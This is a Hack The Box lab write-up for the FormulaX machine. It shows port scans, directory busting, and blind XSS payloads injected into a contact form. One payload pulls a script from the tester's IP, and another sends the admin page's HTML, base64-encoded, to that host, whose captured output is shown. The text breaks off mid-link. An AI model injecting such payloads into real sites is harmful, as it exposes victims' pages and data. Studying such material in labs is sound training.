---
Category: HTB/Machines/Linux
tags:
  - HTB
  - Machine
  - Linux
  - Hard
  - XSS
  - librenms
  - LibreOffice
  - ClientSide
  - simple-git
  - CVE-2022-24439
  - MongoDB
  - PrivilegeEscalation
  - Subdomain
  - Templates
  - RemoteCodeExecution
  - UNO
  - Bridge
  - PasswordReuse
---

![](images/FormulaX.png)

## Summary

The box starts with `Cross-Site Scripting (XSS)` on the `contact formular` of a `chatbot` application. The application is not fully ready to use but has very basic commands like `help` and `history` which could be abused by forging a `JavaScript (.js)` file to read the `history` of the user `admin`. This reveals a `subdomain` called `dev-git-auto-update.chatbot.htb`. It uses `simple-git` in version `v3.14` which is vulnerable to `CVE-2022-24439`. This `CVE` leads to `Remote Code Execution (RCE)` and a shell as `www-data`. Two more users exists on the box. To `escalate privileges` to the first user `frank_dorky` it is required to `dump` credentials of a locally running `MongoDB` which then can be cracked using `John the Ripper` or `hashcat`. The credentials then give access to the `user.txt` and also to `librenms` which runs also locally on port `3000/TCP`. By dumping traffic on port `3000/TCP` on the box itself, it is possible to extract `URL encoded` credentials for the user `admin`. The credentials of `admin` on `librenms` make `templates` usable to gain `Remote Code Execution (RCE)` and a shell as `librenms`. By checking the `environment variables` another `password` can be found which is reused by the user `kai_relay`. This user is able to execute a `script` using `sudo`. The script opens a `UNO bridge` for `LibreOffice` in `headless` mode on port `2002/TCP` which can be abused to `read arbitrary files` on the system and export them as `PDF` file to a accessible location like `/tmp`.

## Table of Contents

- [Reconnaissance](#reconnaissance)
	- [Port Scanning](#port-canning)
	- [Enumeration of Port 80/TCP](#enumeration-of-port-80tcp)
	- [Directory Busting](#directory-busting)
- [Cross-Site Scripting (XSS)](#cross-site-scripting-xss)
- [Enumerating Subdomain](#enumerating-subdomain)
- [Foothold](#foothold)
	- [CVE-2022-24439](#cve-2022-24439)
	- [Reverse Shell Payload](#reverse-shell-payload)
	- [Remote Code Execution](#remote-code-execution)
- [Stabilizing Shell](#stabilizing-shell)
- [Enumeration](#enumeration)
- [Privilege Escalation to franky_dorky](#privilege-escalation-to-franky_dorky)
	- [Cracking the Hash](#cracking-the-hash)
- [user.txt](#usertxt)
- [Pivoting](#pivoting)
- [Privilege Escalation to admin](#privilege-escalation-to-admin)
- [Privilege Escalation to librenms](#privilege-escalation-to-librenms)
- [Privilege Escalation to kai_relay](#privilege-escalation-to-kai_relay)
- [Pivoting](#pivoting)
- [Privilege Escalation to root](#privilege-escalation-to-root)
- [root.txt](#roottxt)
- [Post Exploitation](#post-exploitation)
	- [Get a shell as root](#get-a-shell-as-root)

## Reconnaissance

### Port Scanning

As usual we started with `port scanning` but on the `tcp` side we only got port `22/TCP` and port `80/TCP`.

```c
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sC -sV 10.129.248.196
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-09 14:03 EST
Nmap scan report for 10.129.248.196
Host is up (0.057s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 5f:b2:cd:54:e4:47:d1:0e:9e:81:35:92:3c:d6:a3:cb (ECDSA)
|_  256 b9:f0:0d:dc:05:7b:fa:fb:91:e6:d0:b4:59:e6:db:88 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-cors: GET POST
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_Requested resource was /static/index.html
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.57 seconds
```

```c
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sC -sV -p- 10.129.248.196
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-09 14:04 EST
Nmap scan report for 10.129.248.196
Host is up (0.049s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 5f:b2:cd:54:e4:47:d1:0e:9e:81:35:92:3c:d6:a3:cb (ECDSA)
|_  256 b9:f0:0d:dc:05:7b:fa:fb:91:e6:d0:b4:59:e6:db:88 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-cors: GET POST
| http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_Requested resource was /static/index.html
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.23 seconds
```

A `UDP` scan revealed `snmp` which could be useful later on the box but for now `SNMPv3` was not useful to us.

```c
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sV -sU 10.129.248.196
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-09 14:04 EST
Nmap scan report for 10.129.248.196
Host is up (0.037s latency).
Not shown: 998 closed udp ports (port-unreach)
PORT    STATE         SERVICE VERSION
68/udp  open|filtered dhcpc
162/udp open          snmp    net-snmp; net-snmp SNMPv3 server

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1148.33 seconds
```

```c
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sU -p 162 10.129.248.196
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-09 14:32 EST
Nmap scan report for formulax.htb (10.129.248.196)
Host is up (0.037s latency).

PORT    STATE         SERVICE
162/udp open|filtered snmptrap

Nmap done: 1 IP address (1 host up) scanned in 0.66 seconds
```

### Enumeration of Port 80/TCP

- [http://10.129.248.196/](http://10.129.248.196/)

```c
┌──(kali㉿kali)-[~]
└─$ whatweb http://10.129.248.196/
http://10.129.248.196/ [302 Found] Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.129.248.196], RedirectLocation[/static/index.html], UncommonHeaders[access-control-allow-origin,access-control-allow-credentials], X-Powered-By[Express], nginx[1.18.0]
http://10.129.248.196/static/index.html [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.129.248.196], PasswordField[psw], Script, UncommonHeaders[access-control-allow-origin,access-control-allow-credentials], X-Powered-By[Express], nginx[1.18.0]
```

The box let us create an account which we also could use to login.

![](images/2024-03-09_14-07_registration.png)

| Username | Email               | Password |
| -------- | ------------------- | -------- |
| foobar   | foobar@foobar.local | foobar   |

After a successful login we got prompted with a `chatbot`.

![](images/2024-03-09_14-08_chatbot.png)

Checking the `page source` gave us information about the use of `WebSockets`.

- [view-source:http://10.129.248.196/restricted/chat.html](view-source:http://10.129.248.196/restricted/chat.html)

```c
<!DOCTYPE html>
<html>

<head>
    <link rel="stylesheet" href="[chat.css](view-source:http://10.129.248.196/restricted/chat.css)">
    <script src="[/scripts/axios.min.js](view-source:http://10.129.248.196/scripts/axios.min.js)"></script>
    <title>Chat Application</title>
</head>

<body>
    <center>

        <div id=with_this0></div>
        <div id="main"></div>
        <h1>Chatbot - New way to Solve Problems </h1>
        <p><b>Note:</b>Due to the experimental nature, the results may be subject to inaccuracies</p>
        <div id="big_container"></div>
        <form action="javascript:typing_chat()">
            <input type="text" id="user_message" placeholder="Enter Message">
            <input type="submit" placeholder="Send" />
        </form>

        <p style="color: white;" class="message">Go to Home Page <a href="[/restricted/home.html](view-source:http://10.129.248.196/restricted/home.html)">Home Page</a></p>

    </center>
</body>
<script src="[/socket.io/socket.io.js](view-source:http://10.129.248.196/socket.io/socket.io.js)"></script>
<script src="[./chat.js](view-source:http://10.129.248.196/restricted/chat.js)"></script>

</html>
```

- [view-source:http://10.129.248.196/socket.io/socket.io.js](view-source:http://10.129.248.196/socket.io/socket.io.js)

```c
/*!
 * Socket.IO v4.7.1
 * (c) 2014-2023 Guillermo Rauch
 * Released under the MIT License.
 */
<--- CUT FOR BREVITY --->
```

The `chatbot` was not fully operable but using `help` pointed us to use the `history` command.

![](images/2024-03-09_14-08_chatbot_command.png)

![](images/2024-03-09_14-08_chatbot_command_history.png)

We prepared a simple payload to see if the application would render it.

```c
<h1>test</h1>
```

![](images/2024-03-09_14-08_chatbot_command_history_xss_payload.png)

And it did.

![](images/2024-03-09_14-08_chatbot_command_history_xss.png)

So we probably had found a potential `Cross-Site scripting (XSS)` opportunity.

### Directory Busting

To leverage that we had a look for interesting endpoints.

```c
┌──(kali㉿kali)-[~]
└─$ dirsearch -u http://10.129.248.196/

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/reports/http_10.129.248.196/__24-03-09_14-17-45.txt

Target: http://10.129.248.196/

[14:17:45] Starting: 
[14:17:54] 200 -   46B  - /ADMIN                                            
[14:17:54] 200 -   46B  - /admin                                            
[14:17:54] 200 -   46B  - /Admin                                            
[14:17:54] 200 -   46B  - /admin/                                           
[14:17:54] 200 -   46B  - /admin/.htaccess                                  
[14:17:54] 200 -   46B  - /Admin/                                           
[14:17:54] 200 -   46B  - /admin/_logs/access-log
[14:17:54] 200 -   46B  - /admin/%3bindex/
[14:17:54] 200 -   46B  - /admin/.config                                    
[14:17:54] 200 -   46B  - /admin/_logs/err.log
[14:17:54] 200 -   46B  - /admin/_logs/error-log
[14:17:54] 200 -   46B  - /admin/_logs/error.log
[14:17:54] 200 -   46B  - /admin/_logs/access_log
[14:17:54] 200 -   46B  - /admin/access.log
[14:17:54] 200 -   46B  - /admin/_logs/login.txt
[14:17:54] 200 -   46B  - /admin/_logs/access.log
[14:17:54] 200 -   46B  - /admin/_logs/error_log
[14:17:54] 200 -   46B  - /admin/access.txt
[14:17:54] 200 -   46B  - /admin/account
[14:17:54] 200 -   46B  - /admin/account.js
[14:17:54] 200 -   46B  - /admin/account.jsp
[14:17:54] 200 -   46B  - /admin/admin-login.php
[14:17:54] 200 -   46B  - /admin/account.php
[14:17:54] 200 -   46B  - /admin/account.html
[14:17:54] 200 -   46B  - /admin/admin-login
[14:17:54] 200 -   46B  - /admin/access_log
[14:17:54] 200 -   46B  - /admin/admin
[14:17:54] 200 -   46B  - /admin/admin-login.html
[14:17:54] 200 -   46B  - /admin/admin-login.aspx
[14:17:54] 200 -   46B  - /admin/admin-login.jsp
[14:17:54] 200 -   46B  - /admin/admin-login.js
[14:17:54] 200 -   46B  - /admin/admin/login
[14:17:54] 200 -   46B  - /admin/admin.aspx
[14:17:54] 200 -   46B  - /admin/admin.php
[14:17:54] 200 -   46B  - /admin/admin_login
[14:17:54] 200 -   46B  - /admin/admin_login.php
[14:17:54] 200 -   46B  - /admin/admin.jsp
[14:17:54] 200 -   46B  - /admin/account.aspx
[14:17:54] 200 -   46B  - /admin/admin.js
[14:17:54] 200 -   46B  - /admin/admin_login.jsp
[14:17:54] 200 -   46B  - /admin/admin.html
[14:17:54] 200 -   46B  - /admin/admin_login.aspx
[14:17:54] 200 -   46B  - /admin/admin_login.js
[14:17:54] 200 -   46B  - /admin/adminLogin.jsp
[14:17:54] 200 -   46B  - /admin/adminLogin.html
[14:17:54] 200 -   46B  - /admin/adminLogin.aspx
[14:17:54] 200 -   46B  - /admin/adminLogin.php
[14:17:54] 200 -   46B  - /admin/adminLogin.js
[14:17:54] 200 -   46B  - /admin/backup/
[14:17:54] 200 -   46B  - /admin/adminLogin
[14:17:54] 200 -   46B  - /admin/controlpanel
[14:17:54] 200 -   46B  - /admin/backups/
[14:17:54] 200 -   46B  - /admin/config.php
[14:17:54] 200 -   46B  - /admin/admin_login.html
[14:17:54] 200 -   46B  - /admin/controlpanel.jsp
[14:17:54] 200 -   46B  - /admin/controlpanel.html
[14:17:54] 200 -   46B  - /admin/cp.php
[14:17:54] 200 -   46B  - /admin/cp
[14:17:54] 200 -   46B  - /admin/controlpanel.php
[14:17:54] 200 -   46B  - /admin/adminer.php
[14:17:54] 200 -   46B  - /admin/controlpanel.aspx
[14:17:54] 200 -   46B  - /admin/cp.html
[14:17:54] 200 -   46B  - /admin/default
[14:17:54] 200 -   46B  - /admin/controlpanel.js
[14:17:54] 200 -   46B  - /admin/cp.jsp
[14:17:54] 200 -   46B  - /admin/db/
[14:17:54] 200 -   46B  - /admin/data/autosuggest
[14:17:54] 200 -   46B  - /admin/default/admin.asp
[14:17:54] 200 -   46B  - /admin/download.php
[14:17:54] 200 -   46B  - /admin/error.log
[14:17:54] 200 -   46B  - /admin/cp.aspx
[14:17:54] 200 -   46B  - /admin/cp.js
[14:17:54] 200 -   46B  - /admin/default.asp
[14:17:54] 200 -   46B  - /admin/error.txt
[14:17:54] 200 -   46B  - /admin/dumper/
[14:17:54] 200 -   46B  - /admin/errors.log
[14:17:54] 200 -   46B  - /admin/error_log
[14:17:54] 200 -   46B  - /admin/fckeditor/editor/filemanager/browser/default/connectors/aspx/connector.aspx
[14:17:54] 200 -   46B  - /admin/fckeditor/editor/filemanager/connectors/asp/connector.asp
[14:17:54] 200 -   46B  - /admin/export.php
[14:17:54] 200 -   46B  - /admin/fckeditor/editor/filemanager/browser/default/connectors/php/connector.php
[14:17:54] 200 -   46B  - /admin/fckeditor/editor/filemanager/connectors/asp/upload.asp
[14:17:54] 200 -   46B  - /admin/default/login.asp
[14:17:54] 200 -   46B  - /admin/fckeditor/editor/filemanager/connectors/aspx/upload.aspx
[14:17:54] 200 -   46B  - /admin/FCKeditor
[14:17:54] 200 -   46B  - /admin/fckeditor/editor/filemanager/connectors/php/connector.php
[14:17:54] 200 -   46B  - /admin/fckeditor/editor/filemanager/connectors/aspx/connector.aspx
[14:17:54] 200 -   46B  - /admin/fckeditor/editor/filemanager/connectors/php/upload.php
[14:17:54] 200 -   46B  - /admin/fckeditor/editor/filemanager/browser/default/connectors/asp/connector.asp
[14:17:54] 200 -   46B  - /admin/fckeditor/editor/filemanager/upload/php/upload.php
[14:17:54] 200 -   46B  - /admin/fckeditor/editor/filemanager/upload/aspx/upload.aspx
[14:17:54] 200 -   46B  - /admin/files.php
[14:17:54] 200 -   46B  - /admin/home
[14:17:54] 200 -   46B  - /admin/home.php
[14:17:54] 200 -   46B  - /admin/file.php
[14:17:54] 200 -   46B  - /admin/heapdump
[14:17:54] 200 -   46B  - /admin/home.aspx
[14:17:54] 200 -   46B  - /admin/includes/configure.php~
[14:17:54] 200 -   46B  - /admin/home.js
[14:17:54] 200 -   46B  - /admin/index
[14:17:54] 200 -   46B  - /admin/home.jsp
[14:17:54] 200 -   46B  - /admin/home.html
[14:17:54] 200 -   46B  - /admin/fckeditor/editor/filemanager/upload/asp/upload.asp
[14:17:54] 200 -   46B  - /admin/js/tiny_mce/
[14:17:54] 200 -   46B  - /admin/index.html
[14:17:54] 200 -   46B  - /admin/index.php
[14:17:54] 200 -   46B  - /admin/index.aspx
[14:17:54] 200 -   46B  - /admin/index.jsp
[14:17:54] 200 -   46B  - /admin/js/tiny_mce
[14:17:54] 200 -   46B  - /admin/js/tinymce/
[14:17:54] 200 -   46B  - /admin/js/tinymce
[14:17:54] 200 -   46B  - /admin/log/error.log
[14:17:54] 200 -   46B  - /Admin/knowledge/dsmgr/users/UserManager.asp
[14:17:54] 200 -   46B  - /admin/login
[14:17:54] 200 -   46B  - /Admin/knowledge/dsmgr/users/GroupManager.asp
[14:17:54] 200 -   46B  - /admin/log
[14:17:54] 200 -   46B  - /admin/login.php
[14:17:54] 200 -   46B  - /admin/login.html
[14:17:54] 200 -   46B  - /admin/login.aspx
[14:17:54] 200 -   46B  - /admin/index.js
[14:17:54] 200 -   46B  - /admin/login.jsp
[14:17:54] 200 -   46B  - /admin/login.js
[14:17:54] 200 -   46B  - /admin/login.htm
[14:17:54] 200 -   46B  - /Admin/login/
[14:17:54] 200 -   46B  - /admin/logon.jsp
[14:17:54] 200 -   46B  - /admin/login.do
[14:17:54] 200 -   46B  - /admin/login.py
[14:17:54] 200 -   46B  - /admin/logs/access.log
[14:17:54] 200 -   46B  - /admin/logs/
[14:17:54] 200 -   46B  - /admin/login.asp
[14:17:54] 200 -   46B  - /admin/logs/access_log
[14:17:54] 200 -   46B  - /admin/logs/access-log
[14:17:54] 200 -   46B  - /admin/logs/err.log
[14:17:54] 200 -   46B  - /admin/logs/error-log
[14:17:54] 200 -   46B  - /admin/logs/errors.log
[14:17:54] 200 -   46B  - /admin/login.rb
[14:17:54] 200 -   46B  - /admin/logs/error_log
[14:17:54] 200 -   46B  - /admin/logs/error.log
[14:17:54] 200 -   46B  - /admin/manage/admin.asp
[14:17:54] 200 -   46B  - /admin/manage.asp
[14:17:54] 200 -   46B  - /admin/manage/login.asp
[14:17:54] 200 -   46B  - /admin/manage
[14:17:54] 200 -   46B  - /admin/mysql/
[14:17:54] 200 -   46B  - /admin/phpMyAdmin/
[14:17:54] 200 -   46B  - /admin/phpMyAdmin
[14:17:54] 200 -   46B  - /admin/phpMyAdmin/index.php
[14:17:54] 200 -   46B  - /admin/mysql/index.php
[14:17:54] 200 -   46B  - /admin/phpmyadmin/
[14:17:54] 200 -   46B  - /admin/logs/login.txt
[14:17:54] 200 -   46B  - /admin/pma/
[14:17:54] 200 -   46B  - /admin/pMA/
[14:17:54] 200 -   46B  - /admin/phpmyadmin/index.php
[14:17:54] 200 -   46B  - /admin/PMA/index.php
[14:17:54] 200 -   46B  - /admin/portalcollect.php?f=http://xxx&t=js
[14:17:54] 200 -   46B  - /admin/scripts/fckeditor
[14:17:54] 200 -   46B  - /admin/private/logs
[14:17:54] 200 -   46B  - /admin/secure/logon.jsp
[14:17:54] 200 -   46B  - /admin/mysql2/index.php
[14:17:54] 200 -   46B  - /admin/release
[14:17:54] 200 -   46B  - /admin/sysadmin/
[14:17:54] 200 -   46B  - /admin/signin
[14:17:54] 200 -   46B  - /admin/tiny_mce
[14:17:54] 200 -   46B  - /admin/tinymce
[14:17:54] 200 -   46B  - /admin/pol_log.txt
[14:17:54] 200 -   46B  - /admin/pma/index.php
[14:17:54] 200 -   46B  - /admin/uploads.php
[14:17:54] 200 -   46B  - /admin/phpmyadmin2/index.php
[14:17:54] 200 -   46B  - /admin/user_count.txt
[14:17:54] 200 -   46B  - /admin/views/ajax/autocomplete/user/a
[14:17:54] 200 -   46B  - /admin/web/
[14:17:54] 200 -   46B  - /admin/sxd/
[14:17:54] 200 -   46B  - /admin/upload.php                                 
[14:17:54] 200 -   46B  - /admin/sqladmin/                                  
[14:18:03] 200 -   46B  - /chat                                             
[14:18:05] 200 -   46B  - /contact_us                                       
[14:18:09] 200 -   34KB - /favicon.ico                                      
[14:18:13] 301 -  173B  - /img  ->  /img/                                   
[14:18:16] 200 -   46B  - /logout                                           
[14:18:16] 200 -   46B  - /logout/
[14:18:27] 301 -  187B  - /restricted  ->  /restricted/                     
[14:18:28] 301 -  181B  - /scripts  ->  /scripts/                           
[14:18:31] 301 -  179B  - /static  ->  /static/                             

Task Completed
```

```c
┌──(kali㉿kali)-[~]
└─$ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u http://10.129.248.196/ 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.248.196/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/img                  (Status: 301) [Size: 173] [--> /img/]
/contact_us           (Status: 200) [Size: 46]
/admin                (Status: 200) [Size: 46]
/static               (Status: 301) [Size: 179] [--> /static/]
/scripts              (Status: 301) [Size: 181] [--> /scripts/]
/chat                 (Status: 200) [Size: 46]
/logout               (Status: 200) [Size: 46]
/restricted           (Status: 301) [Size: 187] [--> /restricted/]
/changepassword       (Status: 200) [Size: 46]
Progress: 207643 / 207644 (100.00%)
===============================================================
Finished
===============================================================
```

```c
┌──(kali㉿kali)-[~]
└─$ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u http://10.129.248.196/user/api -r
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.248.196/user/api
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/contact_us           (Status: 200) [Size: 46]
/admin                (Status: 200) [Size: 46]
/chat                 (Status: 200) [Size: 46]
/logout               (Status: 200) [Size: 46]
/changepassword       (Status: 200) [Size: 46]
Progress: 207643 / 207644 (100.00%)
===============================================================
Finished
===============================================================
```

## Cross-Site Scripting (XSS)

We found also `Cross-Sites Scripting (XSS)` in the `contact formular` which gave us a `callback` by using a payload from `HackTricks`.

- [http://10.129.248.196/restricted/contact_us.html](http://10.129.248.196/restricted/contact_us.html)
- [https://medium.com/@dirtycoder0124/blind-xss-a-mind-game-to-win-the-battle-4fc67c524678](https://medium.com/@dirtycoder0124/blind-xss-a-mind-game-to-win-the-battle-4fc67c524678)
- [https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting#blind-xss-payloads](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting#blind-xss-payloads)

```c
"><iframe onload="eval('d=document; _=d.createElement(\'script\');_.src=\'\/\/10.10.16.11/foo\';d.body.appendChild(_)')"> 
```

![](images/2024-03-09_14-47_contact_form_xss.png)

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/FormulaX/serve]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.248.196 - - [09/Mar/2024 14:47:00] code 404, message File not found
10.129.248.196 - - [09/Mar/2024 14:47:00] "GET /foo HTTP/1.1" 404 -
10.129.248.196 - - [09/Mar/2024 14:47:03] code 404, message File not found
10.129.248.196 - - [09/Mar/2024 14:47:03] "GET /foo HTTP/1.1" 404 -
10.129.248.196 - - [09/Mar/2024 14:48:11] code 404, message File not found
10.129.248.196 - - [09/Mar/2024 14:48:11] "GET /foo HTTP/1.1" 404 -
10.129.248.196 - - [09/Mar/2024 14:48:13] code 404, message File not found
10.129.248.196 - - [09/Mar/2024 14:48:13] "GET /foo HTTP/1.1" 404 -
10.129.248.196 - - [09/Mar/2024 14:48:17] code 404, message File not found
10.129.248.196 - - [09/Mar/2024 14:48:17] "GET /foo HTTP/1.1" 404 -
```

`Crow` provided us a modified version which pulled the `source` and send it to us `Base64 encoded`.

```c
"><iframe onload="eval('var http=new XMLHttpRequest(); http.open(\'GET\', \'http://10.10.16.11/?xss=\' + btoa(document.body.innerHTML), true); http.send();')"> 
```

![](images/2024-03-09_14-47_contact_form_xss_base64.png)

```c
10.129.248.196 - - [09/Mar/2024 14:48:56] code 501, message Unsupported method ('OPTIONS')
10.129.248.196 - - [09/Mar/2024 14:48:56] "OPTIONS /?xss=CiAgICA8Y2VudGVyPgogICAgICAgIDxoMj5BZG1pbiBQYW5lbDwvaDI+CiAgICAgICAgPGRpdiBjbGFzcz0ibG9naW4tcGFnZSI+CiAgICAgICAgICAgIDxkaXYgY2xhc3M9ImZvcm0iPgogICAgICAgICAgICAgICAgPGZvcm0gY2xhc3M9ImxvZ2luLWZvcm0iIGFjdGlvbj0iamF2YXNjcmlwdDpzZWFyY2hfbWVzc2FnZSgpIiBtZXRob2Q9InBvc3QiPgogICAgICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJ0ZXh0IiBwbGFjZWhvbGRlcj0iU2VhcmNoIE1lc3NhZ2VzIiBuYW1lPSJzZWFyY2giIGlkPSJzZWFyY2giIHJlcXVpcmVkPSIiPgogICAgICAgICAgICAgICAgICAgIDxidXR0b24gdHlwZT0ic3VibWl0Ij5TZWFyY2g8L2J1dHRvbj4KICAgICAgICAgICAgICAgICAgICA8ZGl2IHN0eWxlPSJtYXJnaW4tdG9wOiA0cHg7Ij4KICAgICAgICAgICAgICAgICAgICAgICAgPGxhYmVsIHN0eWxlPSJjb2xvcjogcmVkOyIgaWQ9ImVycm9yIj4gPC9sYWJlbD4KICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgICA8cCBjbGFzcz0ibWVzc2FnZSI+TG9nb3V0IEZyb20gQWNjb3VudCAtJmd0OyA8YSBocmVmPSIvc3RhdGljL2luZGV4Lmh0bWwiIG9uY2xpY2s9InJlZGlyZWN0KCkiPkxvZ291dDwvYT48L3A+CiAgICAgICAgICAgICAgICA8L2Zvcm0+CiAgICAgICAgICAgIDwvZGl2PgogICAgICAgIDwvZGl2PgogICAgICAgIDxoMj5Vc2VyIE1lc3NhZ2VzPC9oMj4KCiAgICAgICAgPGRpdiBpZD0iYmlnX2NvbnRhaW5lciI+PGRpdiBjbGFzcz0ibmV3X2NvbnRhaW5lciI+ICAKICAgICAgPGRpdj48bGFiZWwgc3R5bGU9ImNvbG9yOiByZWQ7IiBpZD0iZmlyc3RuYW1lIj5mb29iYXIgPC9sYWJlbD48L2Rpdj4KICAgICAgPGRpdj48bGFiZWwgc3R5bGU9ImNvbG9yOiByZWQ7IiBpZD0ibGFzdG5hbWUiPiBmb29iYXI8L2xhYmVsPjwvZGl2PgogICAgICA8ZGl2PjxsYWJlbCBzdHlsZT0iY29sb3I6IHJlZDsiIGlkPSJtZXNzYWdlIj4gIiZndDs8aWZyYW1lIG9ubG9hZD0iZXZhbCgndmFyIGh0dHA9bmV3IFhNTEh0dHBSZXF1ZXN0KCk7IGh0dHAub3BlbihcJ0dFVFwnLCBcJ2h0dHA6Ly8xMC4xMC4xNi4xMS8/eHNzPVwnICsgYnRvYShkb2N1bWVudC5ib2R5LmlubmVySFRNTCksIHRydWUpOyBodHRwLnNlbmQoKTsnKSI+PC9sYWJlbD48L2Rpdj4KICAgICAgPC9pZnJhbWU+PC9sYWJlbD48L2Rpdj48L2Rpdj48L2Rpdj4KICAgIDwvY2VudGVyPgoKCjxzY3JpcHQgc3JjPSIvc2NyaXB0cy9heGlvcy5taW4uanMiPjwvc2NyaXB0Pgo8c2NyaXB0PgogICAgd2luZG93Lm9ubG9hZCA9IGZ1bmN0aW9uICgpIHsKICAgICAgICBnZXRfbWVzc2FnZXMoKTsKICAgIH07CiAgICBjb25zdCByZWRpcmVjdCA9ICgpID0+IHsKICAgICAgICAvL2xvY2FsU3RvcmFnZS5zZXRJdGVtKCJsb2dnZWRfaW4iLCAiZmFsc2UiKTsKICAgICAgICBheGlvcy5nZXQoYC91c2VyL2FwaS9sb2dvdXRgKS50aGVuKCgpID0+IHsKICAgICAgICAgICAgd2luZG93LmxvY2F0aW9uLmhyZWYgPSBgL3N0YXRpYy9pbmRleC5odG1sYAogICAgICAgIH0pCiAgICB9Ozwvc2NyaXB0Pgo8c2NyaXB0IHNyYz0iLi9hZG1pbi5qcyI+PC9zY3JpcHQ+Cgo= HTTP/1.1" 501 -
```

I decoded it with `CyberChef` to keep my shell clean.

- [https://cyberchef.io/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)&input=Q2lBZ0lDQThZMlZ1ZEdWeVBnb2dJQ0FnSUNBZ0lEeG9NajVCWkcxcGJpQlFZVzVsYkR3dmFESStDaUFnSUNBZ0lDQWdQR1JwZGlCamJHRnpjejBpYkc5bmFXNHRjR0ZuWlNJK0NpQWdJQ0FnSUNBZ0lDQWdJRHhrYVhZZ1kyeGhjM005SW1admNtMGlQZ29nSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdQR1p2Y20wZ1kyeGhjM005SW14dloybHVMV1p2Y20waUlHRmpkR2x2YmowaWFtRjJZWE5qY21sd2REcHpaV0Z5WTJoZmJXVnpjMkZuWlNncElpQnRaWFJvYjJROUluQnZjM1FpUGdvZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lEeHBibkIxZENCMGVYQmxQU0owWlhoMElpQndiR0ZqWldodmJHUmxjajBpVTJWaGNtTm9JRTFsYzNOaFoyVnpJaUJ1WVcxbFBTSnpaV0Z5WTJnaUlHbGtQU0p6WldGeVkyZ2lJSEpsY1hWcGNtVmtQU0lpUGdvZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lEeGlkWFIwYjI0Z2RIbHdaVDBpYzNWaWJXbDBJajVUWldGeVkyZzhMMkoxZEhSdmJqNEtJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0E4WkdsMklITjBlV3hsUFNKdFlYSm5hVzR0ZEc5d09pQTBjSGc3SWo0S0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnUEd4aFltVnNJSE4wZVd4bFBTSmpiMnh2Y2pvZ2NtVmtPeUlnYVdROUltVnljbTl5SWo0Z1BDOXNZV0psYkQ0S0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQThMMlJwZGo0S0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQThjQ0JqYkdGemN6MGliV1Z6YzJGblpTSStURzluYjNWMElFWnliMjBnUVdOamIzVnVkQ0F0Sm1kME95QThZU0J